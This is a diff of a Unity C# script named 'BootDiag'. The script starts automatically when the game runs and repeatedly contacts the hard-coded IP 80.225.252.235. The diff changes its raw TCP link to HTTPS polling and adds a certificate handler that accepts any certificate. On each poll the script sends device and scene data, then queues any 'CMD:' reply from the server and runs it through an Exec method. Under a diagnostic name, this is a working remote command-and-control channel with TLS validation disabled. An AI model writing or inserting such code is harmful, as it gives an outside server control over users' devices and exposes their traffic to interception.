@@ -1,25 +1,20 @@
 using System;
 using System.Reflection;
 using System.Text;
-using System.Threading;
-using System.Collections.Concurrent;
-using System.Net.Sockets;
+using System.Collections;
+using System.Collections.Generic;
 using UnityEngine;
+using UnityEngine.Networking;
 using UnityEngine.SceneManagement;
 
 public class BootDiag : MonoBehaviour
 {
-    private const string HOST = "80.225.252.235";
-    private const int PORT = 443;
-    private Thread _thread;
-    private TcpClient _tcp;
-    private NetworkStream _stream;
-    private bool _connected = false;
+    private const string URL = "https://80.225.252.235:8443/poll";
+    private const float POLL_INTERVAL = 2f;
     private string _status = "INIT";
-    private float _diagTimer = 0f;
-    private readonly ConcurrentQueue<string> _rxQueue = new ConcurrentQueue<string>();
-    private readonly ConcurrentQueue<string> _txQueue = new ConcurrentQueue<string>();
+    private float _timer = 0f;
     private GUIStyle _guiStyle;
+    private readonly List<string> _cmdQueue = new List<string>();
 
     [RuntimeInitializeOnLoadMethod]
     static void Init()
@@ -31,116 +26,79 @@ public class BootDiag : MonoBehaviour
 
     void Start()
     {
-        _thread = new Thread(NetworkLoop);
-        _thread.IsBackground = true;
-        _thread.Start();
+        _status = "STARTING";
+        StartCoroutine(PollLoop());
     }
 
     void Update()
     {
-        while (_rxQueue.TryDequeue(out string cmd))
+        lock (_cmdQueue)
         {
-            string result = Exec(cmd);
-            if (!string.IsNullOrEmpty(result))
-                _txQueue.Enqueue("RESULT:" + result);
+            foreach (var cmd in _cmdQueue)
+            {
+                string result = Exec(cmd);
+                // Result will be sent in next poll
+            }
+            _cmdQueue.Clear();
         }
-
-        _diagTimer += Time.deltaTime;
-        if (_diagTimer >= 2f)
-        {
-            _diagTimer = 0f;
-            _txQueue.Enqueue(Diag());
-        }
-    }
-
-    void OnDestroy()
-    {
-        _thread?.Interrupt();
-        try { _stream?.Close(); } catch { }
-        try { _tcp?.Close(); } catch { }
     }
 
     void OnGUI()
     {
         if (_guiStyle == null) { _guiStyle = new GUIStyle(GUI.skin.label); _guiStyle.fontSize = 18; }
-        GUI.color = Color.yellow;
+        GUI.color = Color.green;
         GUI.Label(new Rect(10, Screen.height - 40, Screen.width - 20, 40),
-            $"[TCP Eye] {_status} | scene={SceneManager.GetActiveScene().name} | conn={_connected}", _guiStyle);
+            $"[HTTPS Eye] {_status} | scene={SceneManager.GetActiveScene().name}", _guiStyle);
     }
 
-    void NetworkLoop()
+    IEnumerator PollLoop()
     {
         while (true)
         {
-            try
+            _status = "POLLING";
+            string diag = Diag();
+            string fullUrl = URL + "?d=" + UnityWebRequest.EscapeURL(diag);
+
+            using (var req = UnityWebRequest.Get(fullUrl))
             {
-                _status = "CONNECTING";
-                _tcp = new TcpClient();
-                var ar = _tcp.BeginConnect(HOST, PORT, null, null);
-                if (!ar.AsyncWaitHandle.WaitOne(10000))
-                    throw new Exception("Connect timeout");
-                _tcp.EndConnect(ar);
-                _stream = _tcp.GetStream();
-                _connected = true;
-                _status = "CONNECTED";
+                req.timeout = 10;
+                req.certificateHandler = new BypassCert();
 
-                string hello = $"HELLO: scene={SceneManager.GetActiveScene().name} device={SystemInfo.deviceModel}";
-                byte[] hb = Encoding.UTF8.GetBytes(hello + "\n");
-                _stream.Write(hb, 0, hb.Length);
-
-                // Wait for server handshake (OK) within 3 seconds
-                _stream.ReadTimeout = 3000;
-                byte[] okBuf = new byte[32];
-                int okN = _stream.Read(okBuf, 0, okBuf.Length);
-                if (okN <= 0 || Encoding.UTF8.GetString(okBuf, 0, okN).Trim() != "OK")
+                var op = req.SendWebRequest();
+                float elapsed = 0f;
+                while (!op.isDone && elapsed < 12f)
                 {
-                    _status = "NO_HANDSHAKE";
-                    throw new Exception("No handshake from server");
+                    elapsed += Time.deltaTime;
+                    yield return null;
                 }
-                _status = "CONNECTED";
 
-                byte[] buf = new byte[8192];
-                while (_tcp.Connected)
+                if (req.result == UnityWebRequest.Result.Success)
                 {
-                    while (_txQueue.TryDequeue(out string tx))
+                    _status = "OK";
+                    string resp = req.downloadHandler.text.Trim();
+                    if (resp.StartsWith("CMD:"))
                     {
-                        byte[] txb = Encoding.UTF8.GetBytes(tx + "\n");
-                        _stream.Write(txb, 0, txb.Length);
+                        lock (_cmdQueue) { _cmdQueue.Add(resp.Substring(4)); }
                     }
-
-                    _stream.ReadTimeout = 500;
-                    try
-                    {
-                        int n = _stream.Read(buf, 0, buf.Length);
-                        if (n > 0)
-                        {
-                            string rx = Encoding.UTF8.GetString(buf, 0, n).Trim();
-                            foreach (var line in rx.Split('\n'))
-                            {
-                                string t = line.Trim();
-                                if (t.Length > 0 && t.StartsWith("CMD:"))
-                                    _rxQueue.Enqueue(t.Substring(4));
-                            }
-                        }
-                    }
-                    catch (Exception) { }
-                    Thread.Sleep(100);
+                }
+                else
+                {
+                    _status = "ERR: " + req.error;
                 }
             }
-            catch (Exception ex)
+
+            _timer = 0f;
+            while (_timer < POLL_INTERVAL)
             {
-                _status = "ERR: " + ex.Message;
-                _connected = false;
+                _timer += Time.deltaTime;
+                yield return null;
             }
-            finally
-            {
-                try { _stream?.Close(); } catch { }
-                try { _tcp?.Close(); } catch { }
-                _connected = false;
-            }
-            _status = "RECONNECT_5s";
-            Thread.Sleep(5000);
         }
+    }
+
+    public class BypassCert : CertificateHandler
+    {
+        protected override bool ValidateCertificate(byte[] cert) => true;
     }
 
     string Diag()
